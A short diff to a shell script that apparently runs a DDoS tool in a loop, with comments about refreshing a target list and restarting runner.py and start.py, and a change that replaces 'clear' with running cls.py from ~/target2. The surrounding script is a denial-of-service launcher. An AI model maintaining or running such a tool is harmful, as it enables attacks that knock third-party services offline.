@@ -65,7 +65,8 @@ do
    done
  #echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
  sleep $restart_interval
- clear
+ cd ~/target2
+ python3 cls.py
  #echo -e "\nRESTARTING\nKilling old processes..."
  pkill -f runner.py
  pkill -f ./start.py
